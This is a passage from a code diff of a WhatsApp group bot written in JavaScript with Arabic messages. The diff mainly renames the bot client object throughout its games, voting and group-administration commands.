-	    if (!roof.pilih && !roof.pilih2) ElgazarBot.sendText(m.chat, `لم يتم اختيار اي شئ'[ ⏳ ] انتهت المهلة، تم إلغاؤها بسبب عدم الاستجابة ,\nانتهت اللعبه`)
+	    if (!roof.pilih && !roof.pilih2) Elza3emgonBot.sendText(m.chat, `لم يتم اختيار اي شئ'[ ⏳ ] انتهت المهلة، تم إلغاؤها بسبب عدم الاستجابة ,\nانتهت اللعبه`)
 	    else if (!roof.pilih || !roof.pilih2) {
 	    win = !roof.pilih ? roof.p2 : roof.p
-	    ElgazarBot.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} Didn't لعبه حجر ورقه, انتهت اللعبه`, m)
+	    Elza3emgonBot.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} Didn't لعبه حجر ورقه, انتهت اللعبه`, m)
 	    }
 	    delete this.suit[roof.id]
 	    return !0
@@ -885,13 +885,13 @@ ${isWin ? `@${winner.split('@')[0]} لقد فزت✨` : isTie ? `انتهت ال
 	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
 	    roof.text = m.text
 	    m.reply(`حسنا لقد اخترت: ${m.text} ${!roof.pilih2 ? `\n\nالان اذهب الي المجموعه لرؤيه النتائج` : ''}`)
-	    if (!roof.pilih2) ElgazarBot.sendText(roof.p2, '_لقد اختار خصمك اختيار_\nحان دورك اختر بسرعه اسرع اسرع', 0)
+	    if (!roof.pilih2) Elza3emgonBot.sendText(roof.p2, '_لقد اختار خصمك اختيار_\nحان دورك اختر بسرعه اسرع اسرع', 0)
 	    }
 	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
 	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
 	    roof.text2 = m.text
 	    m.reply(`حسنا لقد اخرت: ${m.text} ${!roof.pilih ? `\n\nالان اذهب الي المجموعه لرؤيه النتائج` : ''}`)
-	    if (!roof.pilih) ElgazarBot.sendText(roof.p, '_لقد اختار خصمك اختيار_\nحان دورك اختر بسرعه اسرع اسرع , 0)', 0)
+	    if (!roof.pilih) Elza3emgonBot.sendText(roof.p, '_لقد اختار خصمك اختيار_\nحان دورك اختر بسرعه اسرع اسرع , 0)', 0)
 	    }
 	    let stage = roof.pilih
 	    let stage2 = roof.pilih2
@@ -904,7 +904,7 @@ ${isWin ? `@${winner.split('@')[0]} لقد فزت✨` : isTie ? `انتهت ال
 	    else if (k.test(stage) && b.test(stage2)) win = roof.p
 	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
 	    else if (stage == stage2) tie = true
-	    ElgazarBot.sendText(roof.asal, `_*النتيجه الان*_${tie ? '\nSERIES' : ''}
+	    Elza3emgonBot.sendText(roof.asal, `_*النتيجه الان*_${tie ? '\nSERIES' : ''}
 
 @${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` لقد ربح \n` : ` وانت خسرت \n`}
 @${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` لقد ربح \n` : ` وانت خسرت  \n`}
@@ -986,8 +986,8 @@ ${arr.slice(6).join('')}
 دور @${room.game.currentTurn.split('@')[0]}
 
 اكتب *surrender* للاستسلام والاعتراف بالهزيمة`
-            if (room.x !== room.o) await ElgazarBot.sendText(room.x, str, m, { mentions: parseMention(str) } )
-            await ElgazarBot.sendText(room.o, str, m, { mentions: parseMention(str) } )
+            if (room.x !== room.o) await Elza3emgonBot.sendText(room.x, str, m, { mentions: parseMention(str) } )
+            await Elza3emgonBot.sendText(room.o, str, m, { mentions: parseMention(str) } )
             } else {
             room = {
             id: 'tictactoe-' + (+new Date),
@@ -1007,7 +1007,7 @@ ${arr.slice(6).join('')}
             try {
             if (this.game) {
             delete this.game
-            ElgazarBot.sendText(m.chat, `تم حذف الجلسه بنجاح`, m)
+            Elza3emgonBot.sendText(m.chat, `تم حذف الجلسه بنجاح`, m)
             } else if (!this.game) {
             m.reply(`الجلسه غير موجوده`)
             } else throw '?'
@@ -1032,13 +1032,13 @@ ${arr.slice(6).join('')}
 
 *اهلا* @${m.mentionedJid[0].split`@`[0]} *اذا كنت تقبل التحدي اكتب نعم واذا لا تريد اكتب لا`
             this.suit[id] = {
-            chat: await ElgazarBot.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
+            chat: await Elza3emgonBot.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
             id: id,
             p: m.sender,
             p2: m.mentionedJid[0],
             status: 'wait',
             waktu: setTimeout(() => {
-            if (this.suit[id]) ElgazarBot.sendText(m.chat, `_[ ⏳ ] انتهت المهلة، تم إلغاؤها بسبب عدم الاستجابة _`, m)
+            if (this.suit[id]) Elza3emgonBot.sendText(m.chat, `_[ ⏳ ] انتهت المهلة، تم إلغاؤها بسبب عدم الاستجابة _`, m)
             delete this.suit[id]
             }, 60000), poin, poin_lose, timeout
             }
@@ -1048,19 +1048,19 @@ ${arr.slice(6).join('')}
                 if (!isCreator) throw mess.owner
                 if (!q) throw 'Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete'
                 if (args[0] === 'mute') {
-                    ElgazarBot.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+                    Elza3emgonBot.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                 } else if (args[0] === 'unmute') {
-                    ElgazarBot.chatModify({ mute: null }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+                    Elza3emgonBot.chatModify({ mute: null }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                 } else if (args[0] === 'archive') {
-                    ElgazarBot.chatModify({  archive: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+                    Elza3emgonBot.chatModify({  archive: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                 } else if (args[0] === 'unarchive') {
-                    ElgazarBot.chatModify({ archive: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+                    Elza3emgonBot.chatModify({ archive: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                 } else if (args[0] === 'read') {
-                    ElgazarBot.chatModify({ markRead: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+                    Elza3emgonBot.chatModify({ markRead: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                 } else if (args[0] === 'unread') {
-                    ElgazarBot.chatModify({ markRead: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+                    Elza3emgonBot.chatModify({ markRead: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                 } else if (args[0] === 'delete') {
-                    ElgazarBot.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+                    Elza3emgonBot.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                 }
             }
             break
@@ -1071,14 +1071,14 @@ if (args[0] === "song") {
 if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "There are still unfinished sessions!"
 let anugas = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/guessSong.json')
 let result = anugas[Math.floor(Math.random() * anugas.length)]
-let msg = await ElgazarBot.sendMessage(m.chat, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, { quoted: m })
-ElgazarBot.sendText(m.chat, `What is the name of this song?\n\nArtist : ${result.artist}\nTime : 60s`, msg).then(() => {
+let msg = await Elza3emgonBot.sendMessage(m.chat, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, { quoted: m })
+Elza3emgonBot.sendText(m.chat, `What is the name of this song?\n\nArtist : ${result.artist}\nTime : 60s`, msg).then(() => {
 tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(60000)
 if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Answer: " + result.jawaban)
-ElgazarBot.sendButtonText(m.chat, [{ buttonId: 'guess song', buttonText: { displayText: 'Guess the song' }, type: 1 }], `Time has run out\nAnswer:  ${tebaklagu[m.sender.split('@')[0]]}\n\nWant to play? press the button below`, `${global.botname}`, m)
+Elza3emgonBot.sendButtonText(m.chat, [{ buttonId: 'guess song', buttonText: { displayText: 'Guess the song' }, type: 1 }], `Time has run out\nAnswer:  ${tebaklagu[m.sender.split('@')[0]]}\n\nWant to play? press the button below`, `${global.botname}`, m)
 delete tebaklagu[m.sender.split('@')[0]]
 }
 }
@@ -1089,7 +1089,7 @@ break
                 let { genMath, modes } = require('./lib/math')
                 if (!text) throw `Mode: ${Object.keys(modes).join(' | ')}\nUsage example: ${prefix}math medium`
                 let result = await genMath(text.toLowerCase())
-                ElgazarBot.sendText(m.chat, `*What is the result of: ${result.soal.toLowerCase()}*?\n\nTime: ${(result.waktu / 1000).toFixed(2)} second`, m).then(() => {
+                Elza3emgonBot.sendText(m.chat, `*What is the result of: ${result.soal.toLowerCase()}*?\n\nTime: ${(result.waktu / 1000).toFixed(2)} second`, m).then(() => {
                     kuismath[m.sender.split('@')[0]] = result.jawaban
                 })
                 await sleep(result.waktu)
@@ -1104,7 +1104,7 @@ break
             const somtoy = solot[Math.floor(Math.random() * solot.length)]
             let sloth =`[  🎰 لعبه الفواكه 🎰  ]\n------------------------\n\n🍒 : 🍌 : 🍇\n${somtoy}<=====\n🍇 : 🍌 : 🍒\n\n------------------------\n[  🎰 لعبه الفواكه 🎰  ]\n\n*معلومة* :\n_إذا حصلت على 3 من نفس الفاكهة_\n_يعني أنك فزت_\n\n_مثال : 🍒 : 🍒 : 🍒_ <=====`
             let buttons = [{ buttonId: 'الفاكهه', buttonText: { displayText: '🎰مره اخري🎰' }, type: 1 }]
-            await ElgazarBot.sendButtonText(m.chat, buttons, sloth, botname, m)
+            await Elza3emgonBot.sendButtonText(m.chat, buttons, sloth, botname, m)
             }
             break
             case 'soulmate': case 'رفيق': {
@@ -1119,7 +1119,7 @@ break
             let buttons = [
                         { buttonId: '❤️', buttonText: { displayText: 'كن رفيق الروح❤✨' }, type: 1 }
                     ]
-                    await ElgazarBot.sendButtonText(m.chat, buttons, jawab, botname, m, {mentions: ments})
+                    await Elza3emgonBot.sendButtonText(m.chat, buttons, jawab, botname, m, {mentions: ments})
             }
             break
             
@@ -1135,7 +1135,7 @@ break
             let buttons = [
                         { buttonId: '💔', buttonText: { displayText: 'فارقني 💔️' }, type: 1 }
                     ]
-                    await ElgazarBot.sendButtonText(m.chat, buttons, jawab, botname, m, {mentions: ments})
+                    await Elza3emgonBot.sendButtonText(m.chat, buttons, jawab, botname, m, {mentions: ments})
             }
             break
             
@@ -1150,7 +1150,7 @@ break
             let buttons = [
                         { buttonId: '「 يب هم مناسبين لبعض😂🤡 」◣', buttonText: { displayText: '「 يب هم مناسبين لبعض😂🤡 」◣' }, type: 1 }
                     ]
-                    await ElgazarBot.sendButtonText(m.chat, buttons, jawab, botname, m, {mentions: menst})
+                    await Elza3emgonBot.sendButtonText(m.chat, buttons, jawab, botname, m, {mentions: menst})
             }
             break
             
@@ -1165,7 +1165,7 @@ break
             let buttons = [
                         { buttonId: '「 يب هم مش مناسبين لبعض 💔 」◣', buttonText: { displayText: '「 يب هم مش مناسبين لبعض 💔 」◣' }, type: 1 }
                     ]
-                    await ElgazarBot.sendButtonText(m.chat, buttons, jawab, botname, m, {mentions: menst})
+                    await Elza3emgonBot.sendButtonText(m.chat, buttons, jawab, botname, m, {mentions: menst})
             }
             break
             
@@ -1180,7 +1180,7 @@ break
             let buttons = [
                         { buttonId: '「 الي يشوفهم مناسبين لبعض زيي يضغط يب 🤡 」◣', buttonText: { displayText: '「 يب هم مناسبين لبعض😂🤡 」◣' }, type: 1 }
                     ]
-                    await ElgazarBot.sendButtonText(m.chat, buttons, jawab, botname, m, {mentions: ments})
+                    await Elza3emgonBot.sendButtonText(m.chat, buttons, jawab, botname, m, {mentions: ments})
             }
             break
             
@@ -1195,7 +1195,7 @@ break
             let buttons = [
                         { buttonId: '「 الي يشوفهم مش مناسبين لبعض زيي يضغط يب 🤡 」◣', buttonText: { displayText: '「 يب هم مش مناسبين لبعض 💔 」◣' }, type: 1 }
                     ]
-                    await ElgazarBot.sendButtonText(m.chat, buttons, jawab, botname, m, {mentions: ments})
+                    await Elza3emgonBot.sendButtonText(m.chat, buttons, jawab, botname, m, {mentions: ments})
             }
             break
             
@@ -1204,7 +1204,7 @@ break
 			if (!text) throw `Example : ${prefix + command} hi|hello`
             let jawab = `${text.split("|")[0]}`
             let buttons = [{ buttonId: 'menu', buttonText: { displayText: `${themeemoji}` }, type: 1 }]
-            await ElgazarBot.sendButtonText(m.chat, buttons, jawab, `${text.split("|")[1]}`, m)
+            await Elza3emgonBot.sendButtonText(m.chat, buttons, jawab, `${text.split("|")[1]}`, m)
             }
             break
             
@@ -1216,7 +1216,7 @@ break
                         key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                     }
                 }
-                ElgazarBot.sendMessage(m.chat, reactionMessage)
+                Elza3emgonBot.sendMessage(m.chat, reactionMessage)
             }
             break  
             case 'join': case 'ادخل': case 'انضم': {
@@ -1225,12 +1225,12 @@ break
                 if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'الرابط خطأ!'
                 m.reply(mess.wait)
                 let result = args[0].split('https://chat.whatsapp.com/')[1]
-                await ElgazarBot.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+                await Elza3emgonBot.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
             }
             break
             case 'اخرج': case 'غادر': {
                 if (!isCreator) throw mess.owner
-                await ElgazarBot.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+                await Elza3emgonBot.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
             }
             break
             case 'setexif': {
@@ -1246,7 +1246,7 @@ break
                 if (!isBotAdmins) throw mess.botAdmin
                 if (!isAdmins) throw mess.admin
 		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
-		await ElgazarBot.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+		await Elza3emgonBot.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
 	}
 	break
 	case 'add': case 'اضافه': case 'ضيف': {
@@ -1254,7 +1254,7 @@ break
                 if (!isBotAdmins) throw mess.botAdmin
                 if (!isAdmins) throw mess.admin
 		let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
-		await ElgazarBot.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+		await Elza3emgonBot.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
 	}
 	break
 	case 'promote': case 'رفع': case 'ترقيه': case 'ترقية': case 'ارفع': {
@@ -1262,7 +1262,7 @@ break
                 if (!isBotAdmins) throw mess.botAdmin
                 if (!isAdmins) throw mess.admin
 		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
-		await ElgazarBot.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+		await Elza3emgonBot.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
 	}
 	break
 	case 'demote': case 'تنزيل': case 'نزل': case 'تخفيض': {
@@ -1270,19 +1270,19 @@ break
                 if (!isBotAdmins) throw mess.botAdmin
                 if (!isAdmins) throw mess.admin
 		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
-		await ElgazarBot.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+		await Elza3emgonBot.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
 	}
 	break
         case 'block': case 'بلوك': {
 		if (!isCreator) throw mess.owner
 		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
-		await ElgazarBot.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+		await Elza3emgonBot.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
 	}
 	break
         case 'unblock': case 'فك-البلوك': {
 		if (!isCreator) throw mess.owner
 		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
-		await ElgazarBot.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+		await Elza3emgonBot.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
 	}
 	break
 	    case 'setname': case 'تغيرالاسم': {
@@ -1290,7 +1290,7 @@ break
                 if (!isBotAdmins) throw mess.botAdmin
                 if (!isAdmins) throw mess.admin
                 if (!text) throw 'اين الاسم الجديد ?'
-                await ElgazarBot.groupUpdateSubject(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
+                await Elza3emgonBot.groupUpdateSubject(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
             }
             break
           case 'setdesc': case 'تغيرالبايو': case 'تغيرالوصف': {
@@ -1298,7 +1298,7 @@ break
                 if (!isBotAdmins) throw mess.botAdmin
                 if (!isAdmins) throw mess.admin
                 if (!text) throw 'اين الوصف الجديد ?'
-                await ElgazarBot.groupUpdateDescription(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
+                await Elza3emgonBot.groupUpdateDescription(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
             }
             break
           case 'setbotpp': case 'حطهاخلفيه': {
@@ -1306,8 +1306,8 @@ break
                 if (!quoted) throw `رد علي صوره واكتب الامر ${prefix + command}`
                 if (!/image/.test(mime)) throw `رد علي صوره واكتب الامر ${prefix + command}`
                 if (/webp/.test(mime)) throw `رد علي صوره واكتب الامر ${prefix + command}`
-                let media = await ElgazarBot.downloadAndSaveMediaMessage(quoted)
-                await ElgazarBot.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
+                let media = await Elza3emgonBot.downloadAndSaveMediaMessage(quoted)
+                await Elza3emgonBot.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
                 m.reply(mess.success)
                 }
                 break
@@ -1317,8 +1317,8 @@ break
                 if (!quoted) throw `رد علي صوره واكتب الامر ${prefix + command}`
                 if (!/image/.test(mime)) throw `رد علي صوره واكتب الامر ${prefix + command}`
                 if (/webp/.test(mime)) throw `رد علي صوره واكتب الامر ${prefix + command}`
-                let media = await ElgazarBot.downloadAndSaveMediaMessage(quoted)
-                await ElgazarBot.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
+                let media = await Elza3emgonBot.downloadAndSaveMediaMessage(quoted)
+                await Elza3emgonBot.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
                 m.reply(mess.success)
                 }
                 break
@@ -1326,20 +1326,20 @@ break
                 if (!m.isGroup) throw mess.group
                 if (!isBotAdmins) throw mess.botAdmin
                 if (!isAdmins) throw mess.admin
-let teks = `══✪〘˙·٠${themeemoji}● منشن للغلابه ●${themeemoji}٠·˙〙✪══
+let teks = `══✪〘˙·٠${themeemoji}● منشن للاعضاء ●${themeemoji}٠·˙〙✪══
  
  🌿 *الرساله : ${q ? q : 'مفيش رساله'}*\n\n`
                 for (let mem of participants) {
                 teks += `${themeemoji} @${mem.id.split('@')[0]}\n`
                 }
-                ElgazarBot.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
+                Elza3emgonBot.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
                 }
                 break
                 case 'hidetag': case 'وهمي': case 'مخفي': {
             if (!m.isGroup) throw mess.group
             if (!isBotAdmins) throw mess.botAdmin
             if (!isAdmins) throw mess.admin
-            ElgazarBot.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
+            Elza3emgonBot.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
             }
             break
 	    case 'style': case 'زغرفه': {
@@ -1390,11 +1390,11 @@ let buttonsVote = [
 
             let buttonMessageVote = {
                 text: teks_vote,
-                footer: ElgazarBot.user.name,
+                footer: Elza3emgonBot.user.name,
                 buttons: buttonsVote,
                 headerType: 1
             }
-            ElgazarBot.sendMessage(m.chat, buttonMessageVote)
+            Elza3emgonBot.sendMessage(m.chat, buttonMessageVote)
 	    }
             break
                case 'upvote': {
@@ -1431,12 +1431,12 @@ ${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 
             let buttonMessageUpvote = {
                 text: teks_vote,
-                footer: ElgazarBot.user.name,
+                footer: Elza3emgonBot.user.name,
                 buttons: buttonsUpvote,
                 headerType: 1,
                 mentions: menvote
              }
-            ElgazarBot.sendMessage(m.chat, buttonMessageUpvote)
+            Elza3emgonBot.sendMessage(m.chat, buttonMessageUpvote)
 	    }
              break
                 case 'devote': {
@@ -1473,12 +1473,12 @@ ${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 
             let buttonMessageDevote = {
                 text: teks_vote,
-                footer: ElgazarBot.user.name,
+                footer: Elza3emgonBot.user.name,
                 buttons: buttonsDevote,
                 headerType: 1,
                 mentions: menvote
             }
-            ElgazarBot.sendMessage(m.chat, buttonMessageDevote)
+            Elza3emgonBot.sendMessage(m.chat, buttonMessageDevote)
 	}
             break
                  
@@ -1506,9 +1506,9 @@ ${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 *${prefix}deletevote* - to delete votes
 
 
-©${ElgazarBot.user.id}
+©${Elza3emgonBot.user.id}
 `
-ElgazarBot.sendTextWithMentions(m.chat, teks_vote, m)
+Elza3emgonBot.sendTextWithMentions(m.chat, teks_vote, m)
 break
 		case 'deletevote': case'delvote': case 'hapusvote': {
             if (!m.isGroup) throw mess.group
@@ -1522,15 +1522,15 @@ case 'group': case 'جروب': {
                 if (!isBotAdmins) throw mess.botAdmin
                 if (!isAdmins) throw mess.admin
                 if (args[0] === 'قفل'){
-                    await ElgazarBot.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`*تم قفل الجروب*`)).catch((err) => m.reply(jsonformat(err)))
+                    await Elza3emgonBot.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`*تم قفل الجروب*`)).catch((err) => m.reply(jsonformat(err)))
                 } else if (args[0] === 'فتح'){
-                    await ElgazarBot.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`*تم فتح الجروب*`)).catch((err) => m.reply(jsonformat(err)))
+                    await Elza3emgonBot.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`*تم فتح الجروب*`)).catch((err) => m.reply(jsonformat(err)))
                 } else {
                 let buttons = [
                         { buttonId: 'جروب فتح', buttonText: { displayText: 'فتح' }, type: 1 },
                         { buttonId: 'جروب قفل', buttonText: { displayText: 'قفل' }, type: 1 }
                     ]
-                    await ElgazarBot.sendButtonText(m.chat, buttons, `حاله الجروب`, botname, m)
+                    await Elza3emgonBot.sendButtonText(m.chat, buttons, `حاله الجروب`, botname, m)
 
              }
             }
@@ -1540,15 +1540,15 @@ case 'group': case 'جروب': {
                 if (!isBotAdmins) throw mess.botAdmin
                 if (!isAdmins) throw mess.admin
              if (args[0] === 'open'){
-                await ElgazarBot.groupSettingUpdate(m.chat, 'unlocked').then((res) => m.reply(`*Successfully Opened Edit Group Info*`)).catch((err) => m.reply(jsonformat(err)))
+                await Elza3emgonBot.groupSettingUpdate(m.chat, 'unlocked').then((res) => m.reply(`*Successfully Opened Edit Group Info*`)).catch((err) => m.reply(jsonformat(err)))
              } else if (args[0] === 'close'){
-                await ElgazarBot.groupSettingUpdate(m.chat, 'locked').then((res) => m.reply(`*Successfully Close Edit Group Info*`)).catch((err) => m.reply(jsonformat(err)))
+                await Elza3emgonBot.groupSettingUpdate(m.chat, 'locked').then((res) => m.reply(`*Successfully Close Edit Group Info*`)).catch((err) => m.reply(jsonformat(err)))
              } else {
              let buttons = [
                         { buttonId: 'editinfo open', buttonText: { displayText: 'Open' }, type: 1 },
                         { buttonId: 'editinfo close', buttonText: { displayText: 'Close' }, type: 1 }
                     ]
-                    await ElgazarBot.sendButtonText(m.chat, buttons, `Mode Edit Info`, botname, m)
+                    await Elza3emgonBot.sendButtonText(m.chat, buttons, `Mode Edit Info`, botname, m)
 
             }
             }
@@ -1562,7 +1562,7 @@ case 'waifucheck':
 cantik = body.slice(1)
 const okebnh1 =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
 const xeonkak = okebnh1[Math.floor(Math.random() * okebnh1.length)]
-ElgazarBot.sendMessage(m.chat, { text: xeonkak }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { text: xeonkak }, { quoted: m })
 break
 case 'mute': {
                 if (!m.isGroup) throw mess.group
@@ -1571,17 +1571,17 @@ case 'mute': {
                 if (args[0] === "on") {
                 if (db.data.chats[m.chat].mute) return m.reply(`It's Been Active Before`)
                 db.data.chats[m.chat].mute = true
-                m.reply(`${ElgazarBot.user.name} has been muted in this group !`)
+                m.reply(`${Elza3emgonBot.user.name} has been muted in this group !`)
                 } else if (args[0] === "off") {
                 if (!db.data.chats[m.chat].mute) return m.reply(`Not Activated Before`)
                 db.data.chats[m.chat].mute = false
-                m.reply(`${ElgazarBot.user.name} has been unmuted in this group !`)
+                m.reply(`${Elza3emgonBot.user.name} has been unmuted in this group !`)
                 } else {
                  let buttons = [
                         { buttonId: 'mute on', buttonText: { displayText: 'On' }, type: 1 },
                         { buttonId: 'mute off', buttonText: { displayText: 'Off' }, type: 1 }
                     ]
-                    await ElgazarBot.sendButtonText(m.chat, buttons, `Mute Bot`, botname, m)
+                    await Elza3emgonBot.sendButtonText(m.chat, buttons, `Mute Bot`, botname, m)
                 }
              }
              break
@@ -1597,14 +1597,14 @@ let waktu = read ? read : unread
 teks += `${global.themeemoji} @${i.userJid.split('@')[0]}\n`
 teks += ` ┗━${global.themeemoji} *Time :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} ${global.themeemoji} *Status :* ${read ? 'Read' : 'Sent'}\n\n`
 }
-ElgazarBot.sendTextWithMentions(m.chat, teks, m)
+Elza3emgonBot.sendTextWithMentions(m.chat, teks, m)
 }
 break
             case 'الرابط': case 'لينك': case 'gclink': case 'grouplink': {
                 if (!m.isGroup) throw mess.group
                 if (!isBotAdmins) throw mess.botAdmin
-                let response = await ElgazarBot.groupInviteCode(m.chat)
-                ElgazarBot.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nلينك الجروب : ${groupMetadata.subject}`, m, { detectLink: true })
+                let response = await Elza3emgonBot.groupInviteCode(m.chat)
+                Elza3emgonBot.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nلينك الجروب : ${groupMetadata.subject}`, m, { detectLink: true })
             }
             break
             case 'ephemeral': {
@@ -1613,9 +1613,9 @@ break
                 if (!isAdmins) throw mess.admin
                 if (!text) throw 'Enter the value enable/disable'
                 if (args[0] === 'enable') {
-                    await ElgazarBot.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+                    await Elza3emgonBot.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                 } else if (args[0] === 'disable') {
-                    await ElgazarBot.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
